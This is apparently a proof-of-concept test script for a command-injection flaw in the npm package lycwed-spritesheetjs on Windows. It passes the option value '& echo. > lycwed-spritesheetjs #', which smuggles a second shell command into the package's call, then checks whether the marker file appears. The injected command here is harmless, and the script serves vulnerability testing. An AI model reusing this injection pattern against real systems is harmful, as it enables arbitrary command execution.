// test("Command Injection in lycwed-spritesheetjs (Windows)", (done) => {
//   expect.assertions(2);
const spritesheet = require("lycwed-spritesheetjs");
const fs = require("fs");
const path = "./lycwed-spritesheetjs"; // <-- match the injected file

try {
  if (fs.existsSync(path)) {
    fs.unlinkSync(path);
    // console.log("File removed:", path);
  }
} catch (err) {
  console.error(err);
}

let file_exist = fs.existsSync(path);
console.log("{ " + file_exist + ", " + false + " }");

spritesheet(
  "./",
  {
    fuzz: "& echo. > lycwed-spritesheetjs #", 
    ext: "json",
  },
  function () {
    file_exist = fs.existsSync(path);
    console.log("{ " + file_exist + ", " + true + " }");

    fs.unlink(path, function (err) {
      // done();
    });
  }
);
// });


